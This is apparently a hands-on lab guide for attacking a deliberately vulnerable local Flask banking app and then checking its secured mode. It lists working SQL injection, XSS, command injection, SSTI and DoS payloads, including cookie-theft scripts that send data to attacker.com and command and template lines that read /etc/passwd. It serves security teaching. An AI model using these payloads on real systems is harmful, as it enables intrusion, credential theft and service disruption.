# Manual Cyber Attack Testing Guide

## ⚠️ DISCLAIMER
**This guide is for educational purposes only. Perform these tests ONLY on the vulnerable version of the banking application in a controlled test environment.**

---

## 🎯 Setup for Manual Testing

1. **Ensure the app is in VULNERABLE mode**
   - Go to login page
   - Select "Vulnerable (Educational)" from the dropdown
   - Click "Switch Mode"

2. **Use a web browser with Developer Tools**
   - Chrome: Press F12 or Ctrl+Shift+I
   - Firefox: Press F12 or Ctrl+Shift+I

3. **Keep the browser console open** (Console tab in DevTools)

---

## 1. SQL INJECTION ATTACKS

### Attack 1.1: Login Bypass (Authentication Bypass)

**Objective:** Log in without knowing valid credentials

**Steps:**
1. Go to login page: `http://localhost:5000/login`
2. In the **Username** field, enter: `' OR '1'='1' --`
3. In the **Password** field, enter anything (e.g., `password`)
4. Click **Login**

**Expected Result:** You should be logged in as the first user in the database (likely admin)

**Other Payloads to Try:**
```
Username: admin' OR '1'='1' --
Password: (anything)

Username: ' OR 1=1 --
Password: (leave empty)

Username: admin'--
Password: (anything)

Username: ' OR 'a'='a
Password: ' OR 'a'='a
```

---

### Attack 1.2: SQL Injection in Registration

**Objective:** Create an account with admin privileges

**Steps:**
1. Go to registration page: `http://localhost:5000/register`
2. In the **Username** field, enter: `hacker', 999999, 'Premium', 1)--`
3. In the **Password** field, enter: `password123`
4. Click **Register**

**Expected Result:** Account created with high balance and admin privileges

**What's Happening:** The SQL query becomes:
```sql
INSERT INTO users (...) VALUES ('hacker', 999999, 'Premium', 1)--', 'password123', ...)
```
The `--` comments out the rest of the query.

---

### Attack 1.3: Data Extraction (UNION-based SQLi)

**Objective:** Extract data from other tables

**Steps:**
1. Go to login page
2. In **Username**, enter: `' UNION SELECT id,username,password,balance,account_type,is_admin FROM users--`
3. In **Password**, enter anything
4. Click **Login**

**Expected Result:** Error message or data leakage in response

---

## 2. CROSS-SITE SCRIPTING (XSS) ATTACKS

### Attack 2.1: Stored XSS via Registration

**Objective:** Store malicious JavaScript in the database

**Steps:**
1. Go to registration page
2. In **Username**, enter: `<script>alert('XSS Attack!')</script>`
3. In **Password**, enter: `test123`
4. Click **Register**
5. Log in as admin (admin/admin123)
6. Go to admin dashboard
7. Look at the users list

**Expected Result:** JavaScript alert popup appears when viewing the user list

**Other XSS Payloads to Try:**
```
<img src=x onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<script>document.location='http://attacker.com/?cookie='+document.cookie</script>
```

---

### Attack 2.2: Cookie Stealing XSS

**Objective:** Steal session cookies

**Steps:**
1. Register with username: `<script>alert(document.cookie)</script>`
2. When the script executes, it will show the session cookie
3. In a real attack, this would send cookies to an attacker's server

**Payload:**
```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

---

## 3. COMMAND INJECTION ATTACKS

### Attack 3.1: Basic Command Injection

**Objective:** Execute system commands on the server

**Steps:**
1. Log in as any user (e.g., john_doe/pass123)
2. In the dashboard, find "Check Balance" form
3. In the **Account ID** field, enter: `1; ls -la`
4. Click **Check Balance**

**Expected Result:** You should see directory listing in the response

---

### Attack 3.2: System Information Gathering

**For Linux/Mac:**
```bash
Account ID: 1; whoami
Account ID: 1; pwd
Account ID: 1; uname -a
Account ID: 1; cat /etc/passwd
Account ID: 1; echo $PATH
Account ID: 1; ps aux
```

**For Windows:**
```bash
Account ID: 1 && whoami
Account ID: 1 && dir
Account ID: 1 && ipconfig
Account ID: 1 && net user
Account ID: 1 && systeminfo
```

---

### Attack 3.3: Chaining Commands

**Steps:**
1. Try: `1; echo "Hacked" > hacked.txt; cat hacked.txt`
2. This creates a file and reads it back

**Other Command Operators:**
- `;` - Sequential execution
- `&&` - Execute if previous succeeds
- `||` - Execute if previous fails
- `|` - Pipe output

---

## 4. SESSION HIJACKING ATTACKS

### Attack 4.1: Cookie Manipulation

**Objective:** Access admin panel without proper authorization

**Steps:**
1. Log in as normal user (john_doe/pass123)
2. Open Browser DevTools → Application/Storage tab
3. Find Cookies → localhost
4. Look for session cookie
5. Try to manually access: `http://localhost:5000/admin`

**Expected Result:** In vulnerable mode, weak session validation may allow access

---

### Attack 4.2: Session Fixation

**Objective:** Fix a session ID before victim logs in

**Steps:**
1. Open browser in incognito mode
2. Go to login page (don't log in)
3. Open DevTools → Console
4. Type: `document.cookie` to see current session
5. Copy the session cookie value
6. In another browser, set this cookie before login
7. Original browser logs in
8. Second browser can now access the session

---

### Attack 4.3: Testing Weak Secret Key

**Objective:** Demonstrate predictable session tokens

**Steps:**
1. Log in and note your session cookie
2. Log out and log in again
3. Compare session cookies
4. In vulnerable mode, they may follow predictable patterns

---

## 5. DENIAL OF SERVICE (DoS) ATTACKS

### Attack 5.1: Rapid Request Flooding (Manual)

**Objective:** Overwhelm server with requests

**Steps:**
1. Log in to the application
2. Open Browser DevTools → Console
3. Paste this code:

```javascript
// Send 100 rapid transfer requests
for(let i = 0; i < 100; i++) {
  fetch('/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'recipient=admin&amount=0.01'
  }).then(r => console.log(`Request ${i+1}: ${r.status}`));
}
```

4. Press Enter

**Expected Result:** 
- **Vulnerable mode:** All requests succeed, server slows down
- **Secured mode:** After 5 requests, you get HTTP 429 (Rate Limited)

---

### Attack 5.2: Account Creation Spam

**Steps:**
1. Open Browser Console on registration page
2. Paste this code:

```javascript
// Create 50 fake accounts
for(let i = 0; i < 50; i++) {
  fetch('/register', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: `username=spam_user_${i}&password=test123`
  }).then(r => console.log(`Account ${i}: ${r.status}`));
}
```

**Expected Result:** Database fills with spam accounts, consuming resources

---

### Attack 5.3: Large Transfer Loop

**Steps:**
1. Log in as user with balance
2. Open Console and run:

```javascript
// Infinite transfer loop (stop with Ctrl+C)
let count = 0;
const ddos = setInterval(() => {
  fetch('/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'recipient=admin&amount=0.01'
  }).then(() => console.log(`Transfer ${++count}`));
}, 100); // Every 100ms

// To stop: clearInterval(ddos);
```

---

## 6. FLASK RCE (Remote Code Execution)

### Attack 6.1: Server-Side Template Injection (SSTI)

**Objective:** Execute Python code on the server

**Steps:**
1. Go to registration page
2. In **Username**, enter: `{{ 7*7 }}`
3. Register and check if "49" appears anywhere
4. If it does, SSTI vulnerability exists!

**Advanced SSTI Payloads:**

```python
# Test for SSTI
{{ 7*7 }}

# Configuration disclosure
{{ config.items() }}

# Secret key disclosure
{{ config['SECRET_KEY'] }}

# Class exploration
{{ ''.__class__.__mro__[1].__subclasses__() }}

# File reading (if successful SSTI)
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Command execution (advanced)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

---

### Attack 6.2: Debug Console Exploitation

**Objective:** Check if Flask debug mode is exposed

**Steps:**
1. Go to a non-existent URL: `http://localhost:5000/non_existent_page`
2. Look for Werkzeug Debugger page
3. If visible, debug mode is enabled (major vulnerability!)

**What You'd See:**
- Interactive Python console
- Full stack trace
- Ability to execute Python code

---

### Attack 6.3: Config Information Disclosure

**Steps:**
1. Try to access: `http://localhost:5000/config`
2. Or use XSS/SSTI to leak: `{{ config }}`
3. Look for:
   - SECRET_KEY
   - Database credentials
   - API keys
   - Debug settings

---

## 🛠️ Tools for Enhanced Testing

### Browser Extensions
- **Burp Suite** - Intercept and modify requests
- **OWASP ZAP** - Automated vulnerability scanning
- **Tamper Data** - Modify POST parameters

### Command-Line Tools
```bash
# SQL Injection with sqlmap
sqlmap -u "http://localhost:5000/login" --data="username=test&password=test" --level=5 --risk=3

# XSS scanning with XSStrike
python xsstrike.py -u "http://localhost:5000/register"

# DoS testing with Apache Bench
ab -n 1000 -c 10 http://localhost:5000/transfer

# Security scanning with Nikto
nikto -h http://localhost:5000
```

---

## 📊 Attack Success Indicators

### SQL Injection Success
- ✅ Logged in without valid credentials
- ✅ Bypassed authentication
- ✅ Error messages revealing SQL syntax
- ✅ Extracted database information

### XSS Success
- ✅ JavaScript alert popup appears
- ✅ Cookie displayed in alert
- ✅ Script stored in database
- ✅ Code executes when viewing page

### Command Injection Success
- ✅ System command output visible
- ✅ File contents displayed
- ✅ Directory listings shown
- ✅ User/system information leaked

### Session Hijacking Success
- ✅ Accessed admin panel without proper auth
- ✅ Session token predictable/reusable
- ✅ Cookie manipulation successful

### DoS Success
- ✅ Server becomes slow/unresponsive
- ✅ Multiple requests accepted without limit
- ✅ Database fills with spam data
- ✅ Error 429 (Rate Limited) in secured mode

### RCE Success
- ✅ Template expressions evaluated (7*7 = 49)
- ✅ Configuration data disclosed
- ✅ Python code executed
- ✅ File system accessed

---

## 🔍 Verification in Secured Mode

After testing vulnerable mode, switch to **Secured Mode** and try the same attacks:

**Expected Results:**
- ❌ SQL Injection: Login fails with validation error
- ❌ XSS: Scripts displayed as text, not executed
- ❌ Command Injection: "Invalid format" error
- ❌ Session Hijacking: Session token validated, access denied
- ❌ DoS: Rate limited after 5 requests (HTTP 429)
- ❌ RCE: Template expressions not evaluated

---

## 📝 Documentation Tips

When testing, document:
1. **Attack Type**
2. **Payload Used**
3. **Steps Taken**
4. **Result (Success/Fail)**
5. **Evidence (Screenshots)**
6. **Vulnerable vs Secured Comparison**

---

## ⚠️ Important Reminders

1. **ONLY test on the vulnerable version**
2. **Use a local test environment**
3. **Never test on production systems**
4. **Never test on systems you don't own**
5. **Document everything for learning purposes**
6. **Compare results in both modes**

---

## 🎓 Learning Outcomes

After completing these manual tests, you should understand:

- How SQL Injection bypasses authentication
- How XSS can steal sensitive data
- How Command Injection executes arbitrary code
- How weak session management enables hijacking
- How lack of rate limiting enables DoS
- How template injection leads to RCE
- Why input validation is critical
- Why parameterized queries are essential
- Why rate limiting protects against abuse
- Why secure session management matters

---

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)

---

**Remember: Ethical hacking means testing with permission in controlled environments for educational and security improvement purposes only!**